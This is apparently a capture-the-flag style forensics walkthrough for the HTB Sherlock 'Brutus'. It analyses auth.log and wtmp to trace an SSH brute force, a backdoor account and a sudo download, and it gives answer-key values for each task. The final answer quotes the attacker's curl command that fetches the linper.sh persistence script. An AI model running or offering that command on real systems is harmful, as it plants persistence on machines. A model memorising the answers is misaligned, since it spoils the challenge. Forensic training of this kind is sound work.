# Brutus

**Category:** DFIR  
**Level:** Very Easy  

![brutusheader](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/brutusheader.JPG?raw=true)

## Scenario  
In this very easy Sherlock, you will familiarize yourself with Unix `auth.log` and `wtmp` logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using `auth.log`. Although `auth.log` is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

**Given:** `brutus.zip` containing `auth.log` and `wtmp`

---

## Task 1  
**Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**

I used the command below to read the log file:

<pre>cat auth.log</pre>

Then I searched for multiple failed attempts on user accounts, which are clear indicators of a brute force attack. After analyzing the log, I identified the IP address responsible for these attempts.

![task1brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task1brutus.JPG?raw=true)

**Answer:** 65.2.161.68

---

## Task 2  
**The brute force attempts were successful and the attacker gained access to an account on the server. What is the username of the account?**

I searched for keywords like `"login successful"` or `"Accepted"` in `auth.log`. After reviewing the logs following multiple failed attempts from the attacker, I found the successful login entry and the account that was accessed.

<pre>grep "Accepted" auth.log</pre>

![task2brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task2brutus.JPG?raw=true)

**Answer:** root

---

## Task 3  
**Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**

Initially, I tried:

<pre>cat wtmp</pre>

But the file was unreadable because it is in binary format. After some research, I discovered a tool called `utmpdump`, which can convert binary data in files like `utmp`, `wtmp`, and `btmp` into a readable format. I used the command below:

<pre>utmpdump /var/log/wtmp</pre>

I obtained readable output and then synchronized the timestamp with entries in `auth.log` to confirm the correct login time.

![task3.1brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task3.1brutus.JPG?raw=true)

![task3.2brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task3.2brutus.JPG?raw=true)

**Answer:** 2024-03-06 06:32:45

---

## Task 4  
**SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**

I correlated the SSH login timestamp in `auth.log` with the session entries in the `utmpdump` output from the `wtmp` file to find the session number associated with the attacker's login.

**Answer:** 37

---

## Task 5  
**The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**

I searched `auth.log` for keywords related to user creation. I used:

<pre>grep "add" auth.log</pre>

I found a log entry indicating that a new user account was added.

![task5brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task5brutus.JPG?raw=true)

**Answer:** cyberjunkie

---

## Task 6  
**What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

I visited the MITRE ATT&CK website and looked under the *Persistence* tactics to find the sub-technique for creating a new account. The relevant ID for this technique is:

![task6brutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/task6brutus.JPG?raw=true)

**Answer:** T1136.001

---

## Task 7  
**What time did the attacker's first SSH session end according to auth.log?**

I analyzed `auth.log` to find the logout or session closure entry that corresponds with the attacker's SSH session. I used:

<pre>grep "session closed" auth.log</pre>

The session end time was recorded in the logs.

**Answer:** 2024-03-06 06:37:24

---

## Task 8  
**The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

I searched `auth.log` for occurrences of `"sudo"` and identified the exact command that the attacker executed using elevated privileges. I used:

<pre>grep "sudo" auth.log</pre>

![lasttaskbrutus](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/lasttaskbrutus.JPG?raw=true)

**Answer:** /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

---

## Brutus solved! 🎉

![brutussolved](https://github.com/candypopZZ/htb-sherlock-walkthrough/blob/main/images/lasttaskbrutus.JPG?raw=true)

### What I learned  
- Reading and analyzing log files  
- Discovered the tool `utmpdump`  
- Learned about MITRE ATT&CK technique for account creation (T1136.001)
